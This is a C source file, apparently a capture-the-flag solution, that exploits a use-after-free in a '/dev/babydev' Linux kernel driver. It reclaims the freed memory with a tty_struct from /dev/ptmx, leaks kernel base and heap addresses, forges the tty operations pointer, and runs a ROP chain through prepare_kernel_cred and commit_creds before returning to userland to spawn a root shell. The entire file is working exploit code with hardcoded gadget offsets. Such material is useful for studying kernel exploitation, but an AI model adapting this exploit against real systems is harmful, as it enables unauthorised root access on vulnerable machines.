#include <stdio.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <stdlib.h>
#include <sys/mman.h>

#define CMD_RESIZE 0x10001
#define PAGE 0x1000
#define errExit(msg) do { perror(msg); exit(EXIT_FAILURE); \
                        } while (0)

int _open()
{
    int fd = open("/dev/babydev", O_RDWR);
    if (fd < 0)
        errExit("failed at open babydev");

    return fd;
}

ulong user_cs;
ulong user_rsp;
ulong user_ss;
ulong user_rflags;

static void save_state() {
	asm(
	"movq %%cs, %0\n"
	"movq %%ss, %1\n"
	"pushfq\n"
	"popq %2\n"
  	"movq %%rsp, %3\n"
	: "=r" (user_cs), "=r" (user_ss), "=r" (user_rflags), "=r" (user_rsp) : : "memory" );
}

void pop_shell(void)
{
    printf("[+] w00t w00t\n");
    // system("/bin/sh");
    char *argv2[] = {"/bin/sh",NULL};
    char *envp2[] = {NULL};
    execve("/bin/sh",argv2,envp2);
}


int main()
{
    ulong kbase, kheap;
    int fd1, fd2;
    int ptmx_fd;
    char buf[0x400];

    save_state();

    fd1 = _open(); // 0x40 (buf)
    fd2 = _open(); // 0x40 (buf)

    // TEST
    // char test_buf[0x40];
    // memset(test_buf, 0x41, 0x40);
    // write(fd1, test_buf, 0x40-1);
    // char test_buf2[0x40];
    // memset(test_buf2, 0x42, 0x40);
    // write(fd2, test_buf2, 0x40-1);

    // kmalloc-1024
    ioctl(fd1, CMD_RESIZE, 0x400);
    close(fd1);

    // kUAF (kmalloc-1024 for tty_struct)
    ptmx_fd = open("/dev/ptmx", O_NOCTTY|O_RDWR);
    if (ptmx_fd < 0)
        errExit("failed at open ptmx");

    read(fd2, buf, 0x400-1);

    // for (int i = 0; i < 0x400; i +=8)
    //     printf("[%d] 0x%llx\n", i / 8, *(ulong *)(buf + i));

    printf("\n\n\n");

    kbase = *(ulong *)(buf + 3*sizeof(long)) - 0xa74f80;
    kheap = *(ulong *)(buf + 0x40);

    printf("[+] kbase = 0x%llx\n", kbase);
    printf("[+] kheap = 0x%llx\n", kheap);

    /* ROP */
    // 0xffffffff81154d2a : push rdx ; mov edx, 0x415b0028 ; pop rsp ; pop rbp ; ret
    ulong push_rdx__pop_rsp_pop_rbp_ret = kbase + 0x154d2a;

// / # cat /proc/kallsyms | grep commit_creds | head -n 1
// ffffffff810a1420 T commit_creds
// / # cat /proc/kallsyms | grep prepare_kernel_cred | head -n 1
// ffffffff810a1810 T prepare_kernel_cred

    ulong commit_creds = kbase + 0x0a1420;
    ulong prepare_kernel_cred = kbase + 0x0a1810;
    // 0xffffffff810d238d : pop rdi ; ret
    ulong pop_rdi = kbase + 0x0d238d;
    // 0xffffffff813f324a : cmp rcx, rsi ; mov rdi, rax ; ja 0xffffffff813f323d ; pop rbp ; ret
    ulong mov_rdi_rax = kbase + 0x3f324a;

    // 0xffffffff8100700c : pop rcx ; ret
    ulong pop_rcx = kbase + 0x00700c;

    // 0xffffffff81063694 : swapgs ; pop rbp ; ret
    ulong swapgs_pop_rbp_ret = kbase + 0x063694;
    // ffffffff8181a797:	48 cf                	iretq  
    ulong iretq = kbase + 0x81a797;

    *(ulong *)(buf + 3*sizeof(long)) = kheap + 0x128; // fake ptr ops to our kheap
    *(ulong *)(buf + 0x160 + 0x60) = push_rdx__pop_rsp_pop_rbp_ret; // fake ops->ioctl

    ulong *rop = (ulong *)(buf + 0x2e0);
    *rop ++= 0x1; // for rbp
    
    *rop ++= pop_rdi;
    *rop ++= 0; // rdi = 0
    *rop ++= prepare_kernel_cred;

    *rop ++= pop_rcx;
    *rop ++= 0;

    *rop ++= mov_rdi_rax;
    *rop ++= 0x2; // rbp
    *rop ++= commit_creds;

    *rop ++= swapgs_pop_rbp_ret;
    *rop ++= 0x3; // rbp
    *rop ++= iretq;

    *rop ++= (ulong )pop_shell;
    *rop ++= user_cs;
    *rop ++= user_rflags;
    *rop ++= user_rsp;
    *rop ++= user_ss;

    write(fd2, buf, 0x400-1);

    ioctl(ptmx_fd, 0xc0debabe, kheap + 0x2a8);


}